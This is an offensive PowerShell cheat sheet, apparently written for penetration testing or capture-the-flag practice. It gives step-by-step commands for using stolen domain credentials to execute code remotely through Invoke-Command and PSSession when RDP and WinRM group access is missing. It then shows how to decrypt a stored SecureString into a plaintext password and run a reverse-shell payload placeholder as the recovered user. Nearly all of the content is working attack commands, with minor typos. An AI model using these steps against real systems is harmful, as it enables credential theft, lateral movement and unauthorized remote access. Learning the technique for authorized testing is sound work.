### Commands:

#### 1) $SecPassword = ConvertTo-SecureString 'PASSWORD' -AsPlainText -Force

#### 2) $Cred = New-Object System.Management.Automation.PSCredential('DOMAIN.LOCAL\USERNAME', $SecPassword)

#### 3) Invoke-Command -Computer COMPUTER_NAME -Credential $Cred -ScriptBlock { COMMAND_TO_EXECUTE } 

### Use case:

### When we have valid credentials on a domain joined user, but he has no access to RDP or/and WinRM (Remote Desktop Users and Remote Management Users)

### Alternatively, we can authenticate with a PSSession

#### 4) $session = New-PSSession -CompuerName COMPUTER_NAME -Credential $Cred -Authentication AUTHENTICATION_METHOD (CREDSSP foe example)

#### 5) Enter-PSSession $session

## Alternate use case: The credentials found are encrypted in some way. To recover the credentials, we do the following commands:

 - echo > pass.txt (Pass the encrypted password to a .txt file)

 - $EncryptedString = Get-Content .\pass.txt (Set a variable that opens the content of the .txt file we created earlier)

 - $SecureString = ConvertTo-SecureString $EncryptedString 

 - $Credential = New-Object System.Management.Automation.PSCredential -ArgumentList "username",$SecureString

 - echo $Credential.GetNetworkCredential().password (Print the decrypted password of the user)

 - $username = 'USER'

 - $password = 'RECOVERED_PASS'

 - $securePassword = ConvertTo-SecureString $password -AsPlainText -Force

 - $credential = New-Object Automation.PSCredential($username, $securePassword)

 - Invoke-Command -ComputerName localHost -Credential $credential -ScriptBlock{YourNewRevShellPayloadHere} 


